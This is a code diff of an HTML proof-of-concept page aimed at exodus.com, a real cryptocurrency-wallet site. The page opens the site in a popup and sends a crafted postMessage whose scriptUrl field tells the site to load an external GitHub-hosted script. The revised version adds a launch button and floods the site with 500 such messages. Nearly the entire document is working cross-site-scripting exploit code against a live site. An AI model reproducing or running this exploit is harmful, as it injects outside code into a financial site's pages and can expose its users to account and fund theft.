@@ -1,23 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Exodus XSS PoC</title>
+  <title>Exodus XSS Flood PoC</title>
 </head>
 <body>
-  <h1>🚨 Exploiting exodus.com via postMessage + scriptUrl</h1>
+  <h1>🚨 Click the button to launch the attack</h1>
+  <button id="launch">🚀 Launch</button>
 
   <script>
-    // الخطوة 1: فتح موقع exodus في نافذة جديدة
-    const exodusWindow = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");
+    document.getElementById("launch").onclick = function () {
+      const exodusWindow = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");
 
-    // الخطوة 2: انتظر قليلًا حتى يُفعّل المستمع
-    setTimeout(() => {
-      // الخطوة 3: أرسل الرسالة التي تحمّل سكربتك
-      exodusWindow.postMessage({
-        type: "event_builder_bootstrap",
-        scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js"
-      }, "https://www.exodus.com");
-    }, 3000); // يمكن زيادتها إلى 5000ms للتأكد
+      if (!exodusWindow) {
+        alert("❌ Popup blocked! Please allow popups and try again.");
+        return;
+      }
+
+      const TOTAL_REQUESTS = 500;
+      const INTERVAL_MS = 120;
+
+      setTimeout(() => {
+        let count = 0;
+        const interval = setInterval(() => {
+          if (count >= TOTAL_REQUESTS) {
+            clearInterval(interval);
+            console.log("✅ Finished sending 500 requests.");
+            return;
+          }
+
+          try {
+            exodusWindow.postMessage({
+              type: "event_builder_bootstrap",
+              scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js"
+            }, "https://www.exodus.com");
+
+            count++;
+            console.log(`🔁 Sent ${count} / ${TOTAL_REQUESTS}`);
+          } catch (e) {
+            console.error("❌ Failed to send message:", e);
+          }
+
+        }, INTERVAL_MS);
+      }, 3000);
+    };
   </script>
 </body>
 </html>
